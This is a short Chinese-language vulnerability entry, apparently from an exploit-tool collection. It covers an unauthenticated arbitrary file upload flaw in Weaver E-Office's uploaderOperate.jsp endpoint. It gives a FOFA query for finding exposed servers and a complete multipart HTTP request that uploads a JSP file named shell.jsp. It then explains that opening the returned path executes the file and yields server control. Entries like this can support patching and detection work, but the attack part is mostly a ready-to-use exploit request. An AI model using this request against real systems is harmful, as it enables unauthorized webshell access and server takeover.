---
source: "LittleBear4/OA-EXPTOOL"
---

# 泛微E-Office uploaderOperate.jsp 任意文件上传漏洞

## 漏洞描述

泛微 E-Office 的 `/workrelate/plan/util/uploaderOperate.jsp` 接口存在任意文件上传漏洞。该接口未做登录校验和文件类型校验，攻击者无需登录即可上传任意文件到服务器，直接获取 Webshell。

## 漏洞影响

```
泛微 E-Office
```

## 网络测绘

```
app="泛微-EOffice"
```

## 漏洞复现

```http
POST /workrelate/plan/util/uploaderOperate.jsp HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.jsp"
Content-Type: application/octet-stream

<% out.println("vulnerable"); %>
------WebKitFormBoundary--
```

上传成功后，响应中返回文件保存路径，直接访问该路径即可执行上传的文件，获取服务器控制权限。
